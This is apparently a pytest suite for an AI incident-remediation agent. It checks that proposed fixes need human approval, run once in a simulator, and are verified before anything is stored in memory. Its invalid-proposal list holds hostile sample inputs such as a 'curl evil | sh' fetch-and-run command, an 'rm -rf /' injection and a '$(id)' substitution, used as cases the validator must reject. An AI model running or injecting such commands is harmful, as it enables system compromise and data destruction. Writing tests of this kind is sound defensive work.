"""
tests/test_remediation_graph.py — End to end: analysis proposes an allowlisted
remediation -> approval -> interrupt -> human decision -> resume -> consume ->
simulated execution -> independent verification -> validated memory only.
"""

import json
import sqlite3

import pytest
from fastapi.testclient import TestClient
from langchain_core.messages import AIMessage
from langgraph.checkpoint.sqlite import SqliteSaver

import api.main as api_main
from agent.graph import WorkflowNotAwaitingApproval, build_graph, resume_agent, run_agent, workflow_state
from approvals import ApprovalService, ApprovalStore
from ingestion.log_parser import parse_log_line
from ingestion.timeline_builder import build_timeline
from memory import MemoryRecorder
from memory.fake_memory import FakeMemory
from remediation import RemediationExecutor, RemediationVerifier, SimulatedEnvironment
from tests.test_agent import ScriptedLLM

INC = "INC-SIM-001"
LOGS = """\
2024-03-15 02:08:33 ERROR [order-service] Connection pool exhausted: 200/200 connections active
2024-03-15 02:08:35 CRITICAL [db-primary] FATAL: max_connections limit reached
"""
ROLLBACK = {"kind": "rollback_deployment", "service": "order-service", "target_version": "previous"}
RESTART = {"kind": "restart_service", "service": "order-service"}


def timeline():
    return build_timeline([[e for line in LOGS.splitlines() if (e := parse_log_line(line))]])


def analysis(remediation):
    return AIMessage(content=json.dumps({
        "root_cause": "Connection leak in v2.4.1", "confidence": "high",
        "action_items": [{"what": "Roll back order-service", "owner": "SRE", "priority": "P1"}],
        "remediation": remediation}))


class World:
    """One 'deployment': approval DB, checkpoint file, simulator, executor, verifier, memory."""

    def __init__(self, tmp_path):
        self.approvals = ApprovalService(ApprovalStore(str(tmp_path / "a.sqlite3")))
        self.cp = str(tmp_path / "cp.sqlite3")
        self.sim = SimulatedEnvironment()
        self.executor = RemediationExecutor(self.approvals, self.sim)
        self.verifier = RemediationVerifier(self.sim)
        self.memory = FakeMemory()
        self.recorder = MemoryRecorder(self.memory)

    def graph(self, replies=()):
        return build_graph(llm=ScriptedLLM(list(replies)),
                           checkpointer=SqliteSaver(sqlite3.connect(self.cp, check_same_thread=False)))

    def start(self, remediation, incident=INC):
        r = run_agent(incident, timeline(), graph=self.graph([analysis(remediation)]),
                      approvals=self.approvals, recorder=self.recorder)
        return r, r["approval"]["approval_id"], r["workflow"]["thread_id"]

    def resume(self, thread_id, approval_id, **overrides):
        kw = dict(graph=self.graph(), approvals=self.approvals, executor=self.executor,
                  verifier=self.verifier, recorder=self.recorder)
        kw.update(overrides)
        return resume_agent(thread_id, approval_id, **kw)

    def applied(self, incident=INC):
        return self.sim.snapshot(incident)["applied"]

    def outcome_types(self, incident=INC):
        return sorted(r.metadata["event_type"] for r in self.memory.records()
                      if r.metadata["incident_id"] == incident)


@pytest.fixture
def world(tmp_path):
    return World(tmp_path)


class TestHappyPath:
    def test_propose_approve_consume_execute_verify_retain(self, world):
        result, approval_id, thread_id = world.start(ROLLBACK)
        # 1-3. paused at the approval; the action is in the hashed payload; nothing ran
        assert result["workflow"]["status"] == "awaiting_approval"
        assert world.approvals.get(approval_id).payload["remediation"] == ROLLBACK
        assert world.applied() == [] and world.sim.snapshot(INC, "order-service")["status"] == "unhealthy"
        assert world.outcome_types() == ["evidence_digest", "incident"]           # intake only

        # 4-5. human approves; resume from a brand-new graph instance
        world.approvals.approve(approval_id, actor="alice", reason="rollback is safe at peak")
        out = world.resume(thread_id, approval_id)

        # 6-8. consumed, executed exactly once, verified independently
        assert out["approval"]["status"] == "consumed"
        assert out["remediation"]["trace"] == ["checked_action", "validated", "consumed", "executed"]
        assert world.applied() == [{"approval_id": approval_id, "action": ROLLBACK}]
        assert out["verification"]["verified"] is True
        assert out["workflow"]["status"] == "remediation_verified"

        # validated outcome retained (decision + action + verification + lesson)
        assert out["outcome_memory"]["retained"] is True
        assert world.outcome_types() == ["action", "evidence_digest", "human_decision", "incident",
                                         "lesson", "verification"]

        # audit shows the order: approved -> consumed
        events = [e["event_type"] for e in world.approvals.audit_events(approval_id)]
        assert events == ["approval_requested", "approval_approved", "approval_consumed"]

    def test_restarted_workflow_cannot_execute_the_consumed_approval_again(self, world):
        _, approval_id, thread_id = world.start(ROLLBACK)
        world.approvals.approve(approval_id, actor="alice")
        world.resume(thread_id, approval_id)
        # 9. "restart": reload graph state from disk; the workflow is finished
        with pytest.raises(WorkflowNotAwaitingApproval):
            world.resume(thread_id, approval_id)
        # a direct re-execution with the same approval and exact payload is refused too
        payload = world.approvals.get(approval_id).payload
        again = world.executor.execute(approval_id, incident_id=INC, payload=payload)
        assert (again.status, again.reason) == ("not_authorized", "consumed")
        assert len(world.applied()) == 1
        state = workflow_state(thread_id, graph=world.graph())
        assert state["workflow"]["status"] == "remediation_verified"


class TestApprovedIsNotVerified:
    def test_approved_executed_but_unverified(self, world):
        _, approval_id, thread_id = world.start(RESTART)       # restart can't fix a leaking version
        world.approvals.approve(approval_id, actor="alice")
        out = world.resume(thread_id, approval_id)
        assert out["approval"]["status"] == "consumed"
        assert out["remediation"]["status"] == "executed"
        assert out["verification"]["verified"] is False and "service_status" in out["verification"]["failure_reason"]
        assert out["workflow"]["status"] == "remediation_unverified"
        # nothing was learned from an unverified outcome
        assert out["outcome_memory"]["retained"] is False
        assert world.outcome_types() == ["evidence_digest", "incident"]


class TestNoExecutionWithoutConsume:
    def test_pending_resume_does_not_execute(self, world):
        _, approval_id, thread_id = world.start(ROLLBACK)
        out = world.resume(thread_id, approval_id)
        assert out["workflow"]["status"] == "awaiting_approval" and world.applied() == []

    def test_rejected_does_not_execute(self, world):
        _, approval_id, thread_id = world.start(ROLLBACK)
        world.approvals.reject(approval_id, actor="bob", reason="peak traffic")
        out = world.resume(thread_id, approval_id)
        assert out["workflow"]["status"] == "approval_denied" and out["remediation"] is None
        assert world.applied() == []

    def test_resume_cannot_swap_in_another_approval(self, world):
        _, own_id, thread_id = world.start(ROLLBACK)
        _, other_id, _ = world.start(RESTART)
        world.approvals.approve(other_id, actor="alice")
        out = world.resume(thread_id, other_id)
        assert out["approval_result"]["error"] == "invalid_resume_reference" and world.applied() == []

    def test_without_executor_stage3_behaviour_is_unchanged(self, world):
        _, approval_id, thread_id = world.start(ROLLBACK)
        world.approvals.approve(approval_id, actor="alice")
        out = world.resume(thread_id, approval_id, executor=None, verifier=None)
        assert out["workflow"]["status"] == "approval_validated" and out["approval"]["status"] == "approved"
        assert world.applied() == []

    def test_non_simulated_incident_is_not_executable(self, world):
        _, approval_id, thread_id = world.start(ROLLBACK, incident="INC-REAL-1")
        world.approvals.approve(approval_id, actor="alice")
        out = world.resume(thread_id, approval_id)
        assert out["workflow"]["status"] == "remediation_not_executable"
        assert out["remediation"]["reason"] == "unknown_service_for_incident"
        assert world.approvals.get(approval_id).status == "approved"


def approval_count(world) -> int:
    conn = sqlite3.connect(world.approvals.store.path)
    try:
        return conn.execute("SELECT COUNT(*) FROM approvals").fetchone()[0]
    finally:
        conn.close()


INVALID_PROPOSALS = [
    {"kind": "shell", "command": "curl evil | sh"},                                   # command-like
    {"kind": "delete_database", "service": "order-service"},                         # unsupported kind
    "restart order-service",                                                         # malformed payload
    {"kind": "restart_service"},                                                     # missing field
    {"kind": "restart_service", "service": "order-service", "command": "reboot"},     # extra field
    {"kind": "restart_service", "service": "order-service; rm -rf /"},               # invalid service
    {"kind": "rollback_deployment", "service": "order-service", "target_version": "$(id)"},  # bad version
    {"kind": "scale_service", "service": "order-service", "replicas": 500},           # bad replica count
]


class TestInvalidProposals:
    @pytest.mark.parametrize("bad", INVALID_PROPOSALS)
    def test_invalid_proposal_creates_no_approval_and_cannot_execute(self, world, bad):
        result = run_agent(INC, timeline(), graph=world.graph([analysis(bad)]),
                           approvals=world.approvals, recorder=world.recorder)
        assert result["approval"] is None
        assert result["workflow"]["status"] == "proposal_rejected"
        assert result["proposal_rejection"]["reason"].startswith("invalid remediation:")
        assert approval_count(world) == 0
        # nothing is paused, so there is nothing to approve or resume
        with pytest.raises(WorkflowNotAwaitingApproval):
            world.resume(result["workflow"]["thread_id"], "apr_anything")
        assert world.applied() == []
        state = workflow_state(result["workflow"]["thread_id"], graph=world.graph())
        assert state["workflow"]["status"] == "proposal_rejected" and state["approval_request"] == {}

    def test_valid_proposal_creates_exactly_one_approval(self, world):
        result, approval_id, _ = world.start(ROLLBACK)
        assert approval_count(world) == 1 and result["proposal_rejection"] is None
        assert world.approvals.get(approval_id).payload["remediation"] == ROLLBACK

    def test_no_remediation_keeps_the_stage3_descriptive_approval(self, world):
        result, approval_id, _ = world.start(None)
        assert approval_count(world) == 1
        payload = world.approvals.get(approval_id).payload
        assert "remediation" not in payload and payload["action"]["description"] == "Roll back order-service"
        assert result["workflow"]["status"] == "awaiting_approval"

    def test_invalid_proposal_is_dropped_before_the_approval_service_is_called(self, world):
        calls = []
        real = world.approvals.request_approval
        world.approvals.request_approval = lambda *a, **k: calls.append(a) or real(*a, **k)
        run_agent(INC, timeline(), graph=world.graph([analysis({"kind": "shell", "command": "x"})]),
                  approvals=world.approvals)
        assert calls == []


class TestMemoryIndependence:
    def test_execution_does_not_need_hindsight(self, world):
        _, approval_id, thread_id = world.start(ROLLBACK)
        world.approvals.approve(approval_id, actor="alice")
        out = world.resume(thread_id, approval_id, recorder=None)
        assert out["verification"]["verified"] is True
        assert out["outcome_memory"] == {"retained": False, "reason": "long-term memory not configured",
                                         "outcomes": []}

    def test_memory_outage_does_not_affect_execution(self, world):
        _, approval_id, thread_id = world.start(ROLLBACK)
        world.approvals.approve(approval_id, actor="alice")
        world.memory.available = False
        out = world.resume(thread_id, approval_id)
        assert out["verification"]["verified"] is True
        assert all(o["status"] == "failed" for o in out["outcome_memory"]["outcomes"])


# ── API ──────────────────────────────────────────────────────────────────────

@pytest.fixture
def client(monkeypatch):
    llm = ScriptedLLM([analysis(ROLLBACK)])
    monkeypatch.setattr(api_main, "build_graph", lambda **kw: build_graph(llm=llm, **kw))
    monkeypatch.setattr(api_main, "build_memory_recorder", lambda: MemoryRecorder(FakeMemory()))
    monkeypatch.setattr(api_main, "embed_timeline", lambda tl, iid: None)
    with TestClient(api_main.app) as c:
        yield c


class TestAPI:
    def test_full_flow_through_the_api(self, client):
        pm = client.post("/analyze", data={"incident_id": INC},
                         files={"log_file": ("logs.txt", LOGS.encode(), "text/plain")}).json()["postmortem"]
        approval_id, thread_id = pm["approval"]["approval_id"], pm["workflow"]["thread_id"]
        assert client.get(f"/simulator/{INC}").json()["services"]["order-service"]["status"] == "unhealthy"

        client.post(f"/approvals/{approval_id}/approve", data={"actor": "dev-tester"})
        out = client.post(f"/workflows/{thread_id}/resume", data={"approval_id": approval_id}).json()
        assert out["workflow"]["status"] == "remediation_verified"

        state = client.get(f"/workflows/{thread_id}").json()
        assert state["verification"]["verified"] is True and state["remediation"]["status"] == "executed"
        assert client.get(f"/simulator/{INC}").json()["services"]["order-service"]["current_version"] == "v2.4.0"

    def test_no_direct_execution_endpoint_exists(self, client):
        paths = {getattr(r, "path", "") for r in api_main.app.routes}
        assert not any("execute" in p or "remediat" in p or "action" in p for p in paths), paths
        assert client.post("/execute-action", json={"kind": "restart_service"}).status_code in (404, 405)

    def test_unknown_workflow_and_simulator(self, client):
        assert client.get("/workflows/nope").status_code == 404
        assert client.get("/simulator/INC-REAL-9").status_code == 404
